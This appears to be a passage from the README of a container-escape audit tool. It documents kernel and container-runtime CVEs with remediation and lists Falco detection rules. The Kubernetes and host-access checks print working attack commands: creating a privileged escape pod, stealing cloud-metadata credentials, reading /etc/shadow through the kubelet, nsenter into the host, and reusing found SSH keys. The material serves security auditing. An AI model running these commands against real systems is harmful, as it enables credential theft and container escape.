A reference-count flaw in the kernel's RDS (Reliable Datagram Sockets) zerocopy send path: a failed zerocopy send drops a pinned page reference it shouldn't, and the public exploit chains this with `io_uring` fixed buffers to make the kernel believe it still holds a valid page after that page has been freed and reused by the page cache — yielding the same controlled page-cache overwrite primitive as Copy Fail, reached through a different subsystem. The underlying bug dates to kernel 4.17 (2018); the working PoC additionally needs `io_uring` features present in roughly 6.6+. Two independent gates must both be open: the `rds`/`rds_tcp` modules loadable, and `io_uring` reachable — many distributions (Ubuntu included) already blacklist RDS by default, which alone breaks the chain.

The engine runs a `compound` check cross-referencing the RDS module audit (check 47) with the `io_uring` reachability probe (check 48); a finding is most actionable when both gates are present.

Remediation:
- Apply the distribution kernel update backporting the RDS zerocopy fix — confirm the exact fixed package version against your vendor tracker, as backports vary
- If RDS is not in use (rare outside Oracle RAC/InfiniBand HPC clusters), blacklist `rds`/`rds_tcp`; on 6.6+ also disable `io_uring` for unprivileged tasks (`kernel.io_uring_disabled=2`) to close the second half of the chain
- Either control alone breaks the documented exploit — you don't need both, but confirm at least one is genuinely in place

#### CVE-2026-43503 -- DirtyClone (CRITICAL)

Disclosed by JFrog Security Research on June 25 2026, found while auditing the earlier Dirty Frag fixes. The fourth member of the DirtyFrag family: `__pskb_copy_fclone()` (and `skb_shift()`) drop the `SKBFL_SHARED_FRAG` safety marker during internal packet cloning — the same flag the original Dirty Frag mitigation introduced to mark file-backed page-cache memory shared into a socket buffer. With the marker lost, an attacker-controlled cloned packet routed through an IPsec/XFRM tunnel undergoes in-place decryption that writes attacker-chosen bytes into the page cache of a privileged binary. **Critically, a kernel patched only for the original Dirty Frag CVEs (CVE-2026-43284/-43500) remains exploitable via this path** — full protection needs the entire patch series. CVE-2026-43503 and CVE-2026-46300 (Fragnesia) are one upstream remediation split across two CVE IDs (the CNA assigned 43503 to the *second* commit) and ship together in vendor advisories — treat them as a pair.

The engine runs a `compound` check: kernel version before the per-series fix, plus presence/loadability of the `esp4`/`esp6`/`rxrpc` in-place-decryption modules. The core vulnerable code (`__pskb_copy_fclone`, `skb_shift`) is in core `skbuff` and isn't module-gated, so kernel version is the authoritative signal.

Remediation:
- Apply the distribution kernel update (mainline fix commit `48f6a5356a33`, first fixed tag v7.1-rc5) and **reboot** — verify `uname -r` reflects the patched kernel
- Interim: blacklist `esp4`/`esp6`/`rxrpc` and drop caches (WARNING: breaks IPsec/VPN and AFS where used)
- Defence-in-depth: disable unprivileged user namespaces to cut the `CAP_NET_ADMIN` acquisition path
- Do not rely on file-integrity tooling — the on-disk binary is never modified

#### CVE-2026-46243 -- CIFSwitch (HIGH)

Disclosed by Asim Manizada on May 28 2026; the bug itself dates to 2007. The kernel's CIFS client registers the `cifs.spnego` key type without validating that key-creation requests actually originate from kernel CIFS. Any unprivileged process can forge a `request_key("cifs.spnego", ...)` call with attacker-controlled fields, and because the default `cifs.spnego` request-key rule launches the `cifs.upcall` helper as root, that rootful helper runs with attacker-supplied parameters — including a target process namespace to pivot into before performing a privileged NSS lookup, which can be hijacked to load an attacker-controlled NSS module as root. Exploitability requires three things together: an unpatched kernel, `cifs-utils` installed with default config, and unprivileged user namespaces enabled — the researcher confirmed it across roughly 30 distro/edition combinations meeting those conditions.

The engine runs a `compound` check (kernel version plus `cifs` module presence), with a supporting `kallsyms_sym` check for `cifs_spnego_key_type` where `/proc/kallsyms` is readable.

Remediation:
- Apply the distribution kernel update (upstream fix commit `3da1fdf4efbc`)
- Interim options: remove `cifs-utils` if SMB mounts aren't needed; delete `/etc/request-key.d/cifs.spnego.conf` (breaks Kerberos-authenticated CIFS mounts only); blacklist the `cifs` module (breaks all CIFS/SMB mounts); or disable unprivileged user namespaces, which removes the namespace-pivot step without affecting CIFS mounts
- SELinux enforcing mode is an effective mitigation even on an unpatched kernel — confirm enforcement status (check 11)

#### CVE-2026-43284 -- Dirty Frag ESP (CRITICAL)

Disclosed May 2026 by Hyunwoo Kim. The IPsec ESP half of the Dirty Frag chain: the xfrm-ESP receive fast path performs in-place decryption over paged fragments (attached via `splice`/`sendfile`/`MSG_SPLICE_PAGES`) that the kernel does not privately own, letting a local user write attacker-controlled plaintext at any chosen offset in the page cache in a single deterministic operation — no race window. Confirmed active in-the-wild exploitation across Ubuntu 24.04, RHEL 10, Debian 12, Amazon Linux 2023, and SUSE 16.

The engine runs a `compound` check (kernel version plus `esp4`/`esp6` module reachability); a single `socket(AF_INET, SOCK_RAW, IPPROTO_ESP)` call auto-loads the module, so "not currently loaded" is not evidence of safety without a blacklist entry.

Remediation:
- Apply the kernel patch immediately (fixed in 6.18.25+, 6.19.14+, or 7.0+)
- Interim: blacklist `esp4`/`esp6` (WARNING: breaks IPsec/VPN tunnels — evaluate operational impact first)
- If IPsec is in active use, prioritise the kernel patch over module blacklisting

#### CVE-2026-43500 -- Dirty Frag RxRPC (CRITICAL)

The RxRPC half of the Dirty Frag chain (used by the AFS filesystem client protocol), performing the same unauthorized in-place decryption over pages it doesn't own as CVE-2026-43284, through a different code path that handles the ESP path's edge cases — the two CVEs together produce a substantially more reliable combined exploit than either alone. **As of disclosure, no distro had shipped a kernel patch for this specific CVE** — module blacklisting was the only available mitigation.

The engine runs a `compound` check (kernel version plus `rxrpc` module reachability), same auto-load caveat as the ESP variant.

Remediation:
- Blacklist `rxrpc` immediately (NOTE: breaks AFS filesystem client if in use — verify before deploying)
- Apply the kernel patch once available for your distribution
- Applying the CVE-2026-43284 (esp4/esp6) mitigation alone is **not sufficient** — this path is independently exploitable

#### CVE-2026-46331 -- pedit COW (HIGH)

A partial copy-on-write page-cache corruption flaw in the kernel's `net/sched` `act_pedit` traffic-control action: `tcf_pedit_act()` derives its writable-range check from a static hint that omits a runtime header offset, so writes inside the per-key loop can land outside the COW'd region and mutate bytes still shared with the page cache. A public, author-verified PoC ("packet_edit_meme") appeared on GitHub within 24 hours of CVE assignment and poisons the page-cached image of setuid-root `/bin/su` directly to a root shell — deterministic, no race. Requires `CAP_NET_ADMIN`, which unprivileged users can obtain via namespace-local capabilities where unprivileged user namespaces are enabled (default on Debian/Ubuntu). Same page-cache-poisoning outcome as Copy Fail and the DirtyFrag family, but a separate subsystem and module gate, so it's tracked as its own entry.

The engine runs a `compound` check (kernel version plus `act_pedit` module presence/loadability).

Remediation:
- Install the patched distribution kernel (upstream fixed in v7.1-rc7) and reboot; confirm against your vendor advisory
- Interim: `act_pedit` auto-loads the moment a pedit rule is referenced, so a plain blacklist is insufficient — use an install override (`install act_pedit /bin/true`) plus `rmmod` if currently loaded. Most hosts run no tc pedit rules and can disable it safely
- Defence-in-depth: disable unprivileged user namespaces to remove the namespace-local `CAP_NET_ADMIN` path (breaks rootless containers and browser sandboxes — evaluate first)
- Treat any host suspected of running the exploit as fully compromised regardless of file-integrity results — the on-disk binary is never touched

#### CVE-2024-1086 -- Flipping Pages (CRITICAL)

A use-after-free in the kernel's `nf_tables` netfilter component: `nft_verdict_init()` allows positive values as a drop error within the hook verdict, causing `nf_hook_slow()` to double-free the associated memory. Present in the kernel for over a decade before discovery. Weaponised in RansomHub and Akira ransomware campaigns (confirmed by CISA) for post-compromise privilege escalation, and a public PoC achieves root with 99.4% reliability on Debian, Ubuntu, and kernelCTF images. Requires unprivileged user namespaces and `nf_tables` loaded — both common defaults.

The engine runs a `compound` check (kernel version plus `nf_tables` module reachability).

Remediation:
- Patch the kernel immediately (fixed in 5.15.149+, 6.1.76+, or 6.6.15+)
- Interim: blacklist `nf_tables` (WARNING: removes nftables firewall support — verify your firewall/NAT setup before applying; see the worked example earlier in this README on checking for an active ruleset first)
- Additional hardening: `kernel.unprivileged_userns_clone=0` removes the exploit's namespace prerequisite
- Note: the exploit does not work on v6.4+ kernels with `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (e.g. Ubuntu 6.5+) — check your kernel's build config as a partial-mitigation signal while patching is scheduled

#### CVE-2025-21756 -- Attack of the Vsock (HIGH)

A use-after-free in the kernel's vsock (Virtual Socket) subsystem: during transport reassignment, `transport->release()` calls `vsock_remove_bound()` without checking whether the socket was actually bound, causing a reference count to hit zero and the vsock object to be freed prematurely — a subsequent `vsock_bind()` then touches freed memory. The public exploit uses `vsock_diag_dump` (not confined by AppArmor) to defeat KASLR by brute-forcing kernel addresses, then crafts fake kernel structures to hijack control flow. Vsock is the VM-to-host communication channel in cloud/hypervisor deployments — a broken trust boundary there is significant; in containers where vsock is exposed it also yields root and potential escape.

The engine runs a `compound` check (kernel version plus `vsock`/`vmw_vsock_vmci_transport` module reachability).

Remediation:
- Patch to v6.6.82+, v6.12.19+, v6.1.134+, or your distribution's equivalent
- If vsock isn't required, blacklist `vmw_vsock_vmci_transport` and `vsock`
- On hypervisor hosts, evaluate whether guest-to-host vsock channels are actually necessary and restrict accordingly

#### CVE-2025-38352 -- Chronomaly (HIGH)

A race condition in the kernel's POSIX CPU timer handling: an exiting task that has already passed `exit_notify()` can call `handle_posix_cpu_timers()` from IRQ context while being reaped concurrently by its parent or a debugger; a concurrent `posix_cpu_timer_del()` fails to detect the in-flight timer state, producing a use-after-free. CISA confirmed exploitation against Android devices; a full working PoC ("Chronomaly" by farazsth98) was published against Linux 6.6-series kernels in January 2026. No root or special capabilities needed to trigger — any container user can attempt the race.

The engine runs a `kernel_version` check against the affected range.

Remediation:
- Patch to 6.16.0+ or your distribution's backport for the 5.15/6.1/6.6/6.12 series
- No effective module-level interim mitigation exists for this one — patching is the only remediation
- Prioritise multi-tenant container hosts and CI/CD nodes running untrusted code

#### CVE-2025-38617 -- Packet Socket Race (HIGH)

A use-after-free in the kernel's packet socket subsystem (`net/packet`): a race between `packet_set_ring()` and `packet_notifier()` around a released lock lets a `NETDEV_UP` event be processed against ring-buffer structures that are being torn down. Present since Linux 2.6.12 (2005); the fix is a two-line lock-window closure. The kernelCTF submission's exploit chain specifically defeats `CONFIG_RANDOM_KMALLOC_CACHES` and `CONFIG_SLAB_VIRTUAL` — modern kernel heap-hardening mitigations — through a four-stage exploit building increasingly powerful primitives, and demonstrates container escape directly. Requires `CAP_NET_RAW`, obtainable via unprivileged user namespaces (default on Debian/Ubuntu).

The engine runs a `compound` check against the affected version range with an `AF_PACKET` socket reachability signal.

Remediation:
- Patch to kernel 6.16+
- As a prerequisite control, disable unprivileged user namespaces to block the `CAP_NET_RAW` elevation path — this doesn't patch the bug but removes the primary unprivileged access route
- Monitor for backports on your 5.15/6.1/6.6/6.12 LTS series

#### CVE-2023-0386 -- OverlayFS SetUID Copy-Up (FUSE) Privilege Escalation (HIGH)

An improper-ownership-management flaw in OverlayFS: copying a setuid file with capabilities from a `nosuid`-mounted lower layer into an upper layer that permits setuid execution mishandles the UID mapping, letting a local user execute the resulting setuid binary with privileges they shouldn't have. OverlayFS is the default storage driver for Docker, containerd, and most container runtimes, so this affects essentially every container deployment using overlay storage. On the CISA KEV list with confirmed active exploitation.

The engine runs a `kernel_version` check against the affected range plus `overlay` module context.

Remediation:
- Patch to the fixed kernel version for your series
- Run containers as non-root (`runAsNonRoot: true`) with `allowPrivilegeEscalation: false` — this limits the blast radius of the setuid escalation even pre-patch
- Apply `readOnlyRootFilesystem: true` where feasible
- Check the CISA KEV entry for the latest confirmed exploitation details

> **Note on CVE ID history:** this entry shares its CVE identifier's history with a data-quality fix made during the v4.5 pass — CVE-2025-38352 was previously mis-tagged onto this OverlayFS entry; the OverlayFS bug's correct identifier is CVE-2023-0386, and CVE-2025-38352 belongs to the unrelated Chronomaly POSIX-CPU-timer entry above. Verify against NVD if you maintain external references to the old tagging.

#### CVE-2022-0847 -- DirtyPipe (HIGH)

The direct ancestor of Copy Fail and the Dirty Frag family: an unprivileged process can overwrite read-only page-cache entries backed by files — including files reachable only via a read-only bind mount — by splicing pipe pages with the `PIPE_BUF_FLAG_CAN_MERGE` flag left unset. A public PoC was published within 24 hours of disclosure, and in-container exploitation against Kubernetes was demonstrated publicly; this was one of the most widely weaponised container-escape bugs of 2022-2023.

The engine runs a `kernel_version` check against the affected range (5.8 through 5.16.10 / 5.15.24 / 5.10.101).

Remediation:
- Patch to 5.15.25+, 5.16.11+, or 5.10.102+
- This CVE is now several years old — if a host is still in the affected range, treat it as behind on security updates generally, not just exposed to this one issue

#### CVE-2016-5195 -- DirtyCOW (CRITICAL)

A race condition in the kernel's copy-on-write handling allowing an unprivileged user to write to read-only memory mappings — present for nine years before discovery, affecting any kernel below 4.8.3. Weaponised in real-world attacks including the DirtyCow Android rootkit, and included in virtually every container-escape toolkit (deepce, CDK) as a standard technique.

The engine runs a `kernel_version` check against the affected range.

Remediation:
- Update the kernel immediately if below 4.8.3
- A kernel this far behind is very likely also vulnerable to numerous other critical CVEs — treat the host as fully compromised and prioritise a full patch cycle, not just this one CVE

#### CVE-2026-43121 -- io_uring zcrx Freelist OOB (HIGH)

A race condition in the kernel's `io_uring` zero-copy-receive (zcrx) subsystem: `io_zcrx_put_niov_uref()` uses a non-atomic read-then-decrement on a reference counter serialized by a lock that a concurrent scrub path (`io_zcrx_scrub()`) doesn't hold, letting a network I/O vector be pushed onto the freelist twice — subsequent freelist pushes then write out of bounds past the allocated array into adjacent slab memory. The `oss-security` disclosure thread mixed confirmed technical analysis with a disputed, unverified exploitation write-up — treat the underlying race and OOB write as real, but "working public LPE PoC" as unconfirmed pending independent verification.

The engine runs a `kernel_version` check against the affected range, complemented by the general `io_uring` reachability probe (check 48).

Remediation:
- Update to a kernel containing the fix (stable 6.18.16+, commit `003049b1c4fb`) — verify the post-reboot running kernel is the fixed build rather than trusting a blog-post date
- Reduce `io_uring` attack surface where it isn't required: `kernel.io_uring_disabled=2`, or block `io_uring_setup`/`io_uring_enter`/`io_uring_register` via seccomp

#### CVE-2022-47939 -- ksmbd Tree-Disconnect UAF (CRITICAL)

A use-after-free in the kernel's in-tree SMB3 server (`ksmbd`): handling an `SMB2_TREE_DISCONNECT` request terminates the tree connection without clearing the associated pointer, which is later dereferenced — triggerable **remotely, without authentication**, by causing tree-disconnect commands to be reprocessed. ZDI scored this 10.0 (NVD 9.8). `ksmbd` is not enabled by default on most distributions, so exposed systems are relatively rare, but where it is enabled and network-reachable this is unauthenticated remote kernel code execution.

The engine runs a `compound` check: kernel in the affected 5.15-5.19 range **and** the `ksmbd` module loaded; kernels ≥ 6.x clear the version check regardless of module state.

Remediation:
- Update the kernel to 5.15.61+ or 5.19.2+ (any later series is unaffected)
- If in-kernel SMB serving isn't required, unload and blacklist `ksmbd`; prefer userspace Samba where an SMB server is actually needed
- Restrict TCP/445 exposure via host firewalling and network policy; verify `ksmbd` isn't auto-loaded in container images

#### CVE-2026-41326 -- Kata CopyFile Symlink Subversion (HIGH)

An authorization-bypass and symlink-following flaw (CWE-61) in the `CopyFile` API of the Kata Containers `kata-agent` — the guest-side interface the host shim uses to manage container lifecycle and transfer files. The agent's policy engine validates the destination *path* of a write but ignores file type and payload: an attacker with host-level access to the `kata-agent` socket creates a symlink via one `CopyFile` call, then writes through it via a second, and the agent blindly follows it — overwriting a target inside the guest. This is a **host-to-guest** integrity violation, most severe for Confidential VMs whose entire security model assumes the guest is isolated from an untrusted host.

The engine tracks this as `check_type=manual`; live detection is `check_kata_agent_socket` (check 50), which flags presence/accessibility of the agent socket from the current context.

Remediation:
- Upgrade Kata Containers to ≥ 3.29.0 (also shipped in OpenShift 4.19.34 and equivalent vendor releases)
- Restrict and authenticate access to the `kata-agent` socket so only the trusted shim can reach it
- Where a custom agent policy is used, validate symlink targets and reject `CopyFile` writes whose resolved path escapes the permitted directory
- Treat any pre-3.29.0 agent as integrity-compromised for CVM deployments specifically

#### CVE-2026-46680 -- containerd runAsNonRoot Bypass (HIGH)

An input-validation bug in containerd: a container launched with a numeric `User` directive too large to parse as a 32-bit integer gets that value treated as a *username* instead and resolved against the image's `/etc/passwd` — a crafted image mapping that oversized numeric string to root (UID 0) causes the container to run as root despite Kubernetes' `runAsNonRoot` control being set. Closely related to the earlier CVE-2024-40635 (same overflow/wraparound class). No public exploit code, but the mechanism is simple and requires only a crafted image.

The engine tracks this as `check_type=manual`; the observable end-state (running as UID 0 without userns remapping) is caught by check 27.

Remediation:
- Upgrade containerd to ≥ 1.7.32, 2.0.9, 2.2.4, or 2.3.1 (2.1.x is end-of-life with no fix — migrate off it)
- Enforce a specific numeric `runAsUser` in the Pod securityContext — this overrides the image `USER` directive and prevents the bypass regardless of containerd version
- Kubernetes ≥ 1.34 enforces `runAsNonRoot` correctly regardless of this bug
- Admit only trusted images; use policy (OPA/Kyverno) to reject `USER` values ≥ 2147483647

#### CVE-2026-55686 -- Podman WORKDIR Symlink Host Write (MEDIUM)

A symlink-following flaw in Podman/libpod: a malicious image whose `WORKDIR` path contains a symlink can cause Podman, during host-side working-directory creation, to create a directory at the symlink's target on the host filesystem. A race-dependent variant can also modify ownership of an existing host path. Impact is bounded — the attacker controls the target path but not arbitrary file contents — and no weaponised PoC is public.

The engine tracks this as `check_type=manual`; `component_fixed` is marked `VERIFY` pending confirmation of the exact fixed Podman version from GHSA-q6r4-3wmg-fwcq.

Remediation:
- Upgrade Podman/libpod to the fixed release (confirm the version from the GHSA once published)
- Run only trusted images; treat images with a symlinked `WORKDIR` as suspicious
- Covered behaviourally by the existing symlink/masked-path race checks and the writable-mount checks in this tool

#### CVE-2026-41579 -- runc /dev Symlink Limited Host Write (MEDIUM)

A low-severity flaw in runc's rootfs preparation: `setupPtmx` and `setupDevSymlinks` create `/dev` symlinks during container setup, and a malicious image supplying a crafted symlink could obtain limited host filesystem write access — the same bug class as the November 2025 runc masked-path/symlink CVEs, missed during that hardening pass. Runc's own analysis considers the resulting write access too narrow to be an arbitrary host-file overwrite; released without an embargo specifically because severity is low.

The engine tracks this as `check_type=manual`; the broader vulnerable-runc-version condition and related masked-path CVEs are caught by check 26.

Remediation:
- Update runc to ≥ 1.4.3 or ≥ 1.5.0-rc3, and ensure containerd/Docker actually ship the patched binary
- Run only trusted images

#### CVE-2019-5736 -- runc /proc/self/exe Host Binary Overwrite (CRITICAL)

The original runc container escape, and still on the CISA KEV list. Because runc did not open its own executable with `O_CLOEXEC`, a container process running as root can open `/proc/self/exe` — a magic-link back to the host runc binary — and use the leaked, still-open file descriptor to overwrite the host binary from inside the container. Triggerable either via a malicious image run with `runc run`, or by an attacker with write access inside a container later attached via `runc exec`. Once the host runc binary is replaced, the next container start/exec on that host executes attacker code as root. Public PoCs and a Metasploit module exist.

Detection is a three-state model, not a version compare, since host runc is normally invisible from inside a container: check 52's live version probe gives a definitive verdict when reachable; absent that, check 27's user-namespace-remapping signal shows whether the escape *precondition* (in-container root mapping to host root) is present. A remapped root blocks this specific overwrite regardless of runc version, and downgrades the finding accordingly.

Remediation:
- Upgrade runc to ≥ 1.0-rc7 and confirm the host's Docker/containerd/CRI-O ship the patched binary (Docker ≥ 18.09.2) — verify with `runc --version` on the host, not inside a container
- Strongest available control short of upgrading: user-namespace remapping, which makes this specific overwrite path fail regardless of runc version
- Avoid `exec` into untrusted running containers; run only trusted images

#### CVE-2024-21626 -- runc process.cwd Leaked-FD Container Breakout (Leaky Vessels) (CRITICAL)

An order-of-operations breakout in runc ≤ 1.1.11: an internal file-descriptor leak lets a newly spawned container process inherit a working directory that resolves into the host filesystem namespace, because runc didn't verify the final working directory stayed inside the container mount namespace after `chdir`. Triggerable via a malicious image on `runc run`/`docker build` (including via `FROM`/`ONBUILD`), or from inside a running container via `runc exec`; variant attacks extend this to overwriting semi-arbitrary host binaries for a complete escape. Public PoCs exist for both vectors; not CISA KEV-listed. The Leaky Vessels BuildKit sibling CVEs (CVE-2024-23651/23652/23653) are intentionally out of scope — they're image-build tooling, not the container runtime.

Like CVE-2019-5736, this uses a three-state model. Its one genuinely useful in-container signal: runc 1.1.12's actual fix is a check that a process's working directory stays inside the container root, so a `/proc/*/cwd` symlink resolving onto the host filesystem is strong evidence of an in-progress or successful breakout — though a clean result there means "no active breakout observed," not "patched," since a fresh malicious image can still trigger the underlying leak.

Remediation:
- Upgrade runc to ≥ 1.1.12 and rebuild/re-pull anything that bundles it (Docker, containerd, CRI-O); apply managed-Kubernetes node updates per your provider; verify with `runc --version` on the host
- Interim/defence-in-depth: treat `FROM`/`ONBUILD` base images as untrusted input; disabling unprivileged user namespaces shrinks the surrounding escalation surface without fixing the underlying fd leak

#### CVE-2022-0492 -- cgroup release_agent Escape (HIGH)

An improper-authentication flaw in cgroup v1's `release_agent` mechanism: `cgroup_release_agent_write()` didn't verify the writing process actually had the privilege normally required to set the `release_agent` program. A process with `CAP_SYS_ADMIN` — including one obtained inside a new user+cgroup namespace on a misconfigured system — can point `release_agent` at an attacker-controlled program, which the kernel then executes on the **host**, outside all container namespaces, when the last task in the cgroup exits. On the CISA KEV list; the release-agent escape is a one-click technique implemented in both CDK and deepce and is one of the most widely documented container escapes in existence.

This is a dual-nature entry: primary detection is behavioural (the writable-`release_agent` probe, check 12, plus the `/sys` mount logic in check 19), but the engine also surfaces NVD kernel version data as a supporting signal since the upstream fix was itself a hardening change.

Remediation:
- Migrate workloads to cgroup v2, which has no `release_agent`
- Mount cgroupfs read-only inside containers; drop `CAP_SYS_ADMIN` from application containers
- Apply seccomp to block `mount(2)`/`unshare(2)`/`clone(2)` with namespace flags; enforce Pod Security Admission at `restricted`

</details>

<details>
<summary><h3>Kubernetes and cloud</h3></summary>

#### Check 6 -- Service account token and RBAC (HIGH-CRITICAL)

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# What can this token do?
curl -s -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews

# If it has secrets access
curl -s -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# If it can create pods -- launch a privileged escape pod
curl -s -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/default/pods -d @evil-privileged-pod.json
```

Remediation:

```yaml
spec:
  automountServiceAccountToken: false
```

Audit permissions with `kubectl auth can-i --list`.

#### Check 7 -- Environment variable secret leakage (MEDIUM)

```bash
printenv
cat /proc/1/environ | tr '\0' '\n'
```

Remediation: Mount secrets as files rather than env vars. Use an external secrets manager. Rotate anything exposed.

#### Check 15 -- Cloud IMDS (CRITICAL)

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# GCP
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Remediation: Enforce IMDSv2 on AWS. Use Workload Identity on GCP/Azure. Block `169.254.169.254` via NetworkPolicy.

#### Check 16 -- Kubelet API unauthenticated (CRITICAL)

```bash
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=cat /etc/shadow"
curl http://<node-ip>:10255/pods
```

Remediation: Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet.

#### Check 20 -- Secret mount directories (HIGH)

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
ls /run/secrets/
```

Remediation: Use projected service account tokens with short expiry:

```yaml
volumes:
  - name: token
    projected:
      sources:
        - serviceAccountToken:
            expirationSeconds: 3600
            path: token
```

#### Check 30 -- Kubernetes RBAC active probing (HIGH-CRITICAL)

The script actively POSTs `SelfSubjectAccessReview` requests to check six specific permissions: creating pods in kube-system, listing secrets cluster-wide, executing into pods, binding ClusterRoles, and creating DaemonSets.

```bash
# If create pods in kube-system is allowed
kubectl run escape --image=ubuntu --privileged --overrides='
{"spec":{"hostPID":true,"hostNetwork":true,
 "volumes":[{"name":"h","hostPath":{"path":"/"}}],
 "containers":[{"name":"c","image":"ubuntu",
   "volumeMounts":[{"name":"h","mountPath":"/host"}]}]}}'
```

Remediation: Full RBAC audit. Use namespace-scoped Roles rather than ClusterRoles.

</details>

<details>
<summary><h3>Host access</h3></summary>

#### Check 18 -- Namespace escape tooling (MEDIUM)

```bash
nsenter -t 1 -m -u -i -n -p -- bash
crictl ps && crictl exec -it <container-id> bash
```

Remediation: Minimal or distroless base images. Enforce image scanning in CI.

#### Check 21 -- SSH private keys readable (HIGH)

```bash
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
ssh -i /found/key user@internal-host
```

Remediation: Never bake SSH keys into images. Use short-lived certificates.

#### Check 31 -- Additional runtime sockets (CRITICAL)

```bash
# Podman
podman -r --url unix:///run/podman/podman.sock run --privileged ...

# BuildKit -- inject into CI builds or exfiltrate build secrets
buildctl --addr unix:///run/buildkit/buildkitd.sock build ...
```

Remediation: Audit all volume mounts for runtime socket paths.

</details>

## Integration

### Falco

This script is point-in-time. For continuous runtime detection, pair it with Falco rules covering:

- Writes to `release_agent` or `core_pattern`
- Spawning of `nsenter`, `unshare`, or `runc` inside containers
- Access to `/var/run/docker.sock`
- Unexpected outbound connections to `169.254.169.254`
- `AF_ALG` socket creation from non-root processes (Copy Fail indicator)
- `LD_PRELOAD` set to paths in `/tmp` or `/dev/shm` (NVIDIAScape indicator)
- Symlink creation over `/dev/null` or `/dev/pts/*` (runc CVE-2025-31133 indicator)
- `nft` execution or `nf_tables` interaction by non-root users (CVE-2026-23111 indicator)
- `pidfd_getfd` use against setuid processes by non-root users (CVE-2026-46333 indicator)
- `io_uring_setup` / `io_uring_enter` from unprivileged container processes (CVE-2026-43121 / io_uring LPE indicator)
- `setsockopt(TCP_ULP, "tls")` from workload processes (kTLS/sockmap UAF surface)
- Access to the kata-agent socket or writes into `/run/kata-containers/shared/*` (CVE-2026-41326 indicator)
- On arm64 KVM hosts: unexpected guest-driven activity around the vGIC-ITS / `/dev/kvm` (CVE-2026-46316 ITScape indicator)

### CI/CD

```bash
CRITICAL_COUNT=$(./container_escape_audit.sh --json --no-report \
  | jq '[.findings[] | select(.severity=="CRITICAL")] | length')
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo "FAILED: $CRITICAL_COUNT critical escape vectors detected"
  exit 1
fi
```

### SIEM

```bash
./container_escape_audit.sh --json --no-report | \
  jq -c '.findings[]' | \
  while read -r finding; do
    curl -s -X POST https://your-siem/api/events \
      -H 'Content-Type: application/json' \
      -d "$finding"
  done
```

## CVE engine

CVE checks are driven by `cve_checks.conf` — a plain-text key=value database that lives alongside the script. The engine parses it at runtime and runs the appropriate test for each entry. The script does not need to be modified to add, update, or disable a CVE.

### Adding a new CVE

Append a block to `cve_checks.conf`:

```ini
cve_id=CVE-2025-XXXXX
name=Short name
cvss=8.1
severity=HIGH
check_type=compound
introduced=6.1
fixed_versions=6.6:6.6.50 6.12:6.12.5
upstream_ranges=introduced|6.1 range|6.1|6.6.50 range|6.7|6.12.5
distro_status=ubuntu|24.04|generic|fixed|6.8.0-50.50 debian|bookworm|fixed|6.1.120-1 debian|bullseye|vulnerable
vendor_defer=rhel|RHSA-2025-XXXX amazon|ALAS-CVE-2025-XXXXX
itw=no
poc_public=yes
cisa_kev=no
subsystem=fs/btrfs
module_names=btrfs
mitigation=none
socket_af=none
socket_type=none
socket_proto=none
what=What the vulnerability is...
impact=What an attacker can do...
exploit=How hard it is to exploit...
rec=How to fix it...
```

**Version fields (preferred, NVD-backed):**
- `upstream_ranges` — the authoritative source for **vanilla/mainline** kernels, taken from the NVD CPE configuration. Tokens are `introduced|<version>` (lower bound; below it ⇒ not-affected) and `range|<from-inclusive>|<fixed-exclusive>` (an affected interval). A vanilla kernel inside any range is vulnerable; outside all ranges it is not-affected (closed-world). Delimiter is `|` — never `:`, because Debian epochs use `:`. When NVD writes "Up to (**including**) X", encode the exclusive bound as the next patch release so X itself stays vulnerable.
- `distro_status` — per-distribution-release status for **packaged** kernels: `distro|release[|flavour]|status[|version]`, where status is `fixed` (with a package version), `not-affected`, or `vulnerable`. This is authoritative for distro kernels, whose back-ported fixes are invisible in the base version string. Ubuntu versions compare with the `ABI.upload` scheme; Debian with `dpkg` rules.
- `vendor_defer` — distributions (RHEL, Amazon, SUSE) whose back-port status can't be judged from a version string; the engine reports *defer to vendor advisory* rather than guessing.
- `fixed_versions` — the legacy flat field, still read as a fallback for entries not yet migrated.

To disable an entry without removing it, prefix its `cve_id` line with `#`.

**Every entry must include both `rec` and `mitigation`.** The `rec` field is the full remediation (usually "patch to version X"); the `mitigation` field is an interim compensating control that reduces risk before patching (for example a `modprobe` blacklist, a sysctl, or a seccomp rule). Both are surfaced together in each active finding's recommendation, so an operator always sees a fix *and* a stop-gap. If no interim control exists, set `mitigation=none` — the finding will then state "Interim mitigation: none available — patching/upgrading is the only remediation." A missing (rather than `none`) `mitigation` or `rec` field triggers an `[INFO]` warning at load time so the gap is visible. Inline `# comments` are stripped from machine-parsed fields (versions, enums, socket params, `arch`) but preserved verbatim in prose fields (`what`, `impact`, `exploit`, `rec`, `mitigation`, `notes`), so keep prose-field annotations inside the sentence rather than as trailing comments.

### Check types

| Type | What it does |
|------|-------------|
| `kernel_version` | Judges the running kernel against the entry's `upstream_ranges` / `distro_status` / `vendor_defer` (falling back to legacy `fixed_versions`) and returns a **vulnerable / not-affected / defer / unknown** verdict, using the detected distro, release, flavour and installed package version with the correct per-scheme comparator. Absent or unmatched data ⇒ *unknown*, never a silent pass. |
| `module_loaded` | Checks `/proc/modules` for the listed `module_names` |
| `socket_family` | Attempts to open a socket with the given `socket_af` / `socket_type` / `socket_proto` |
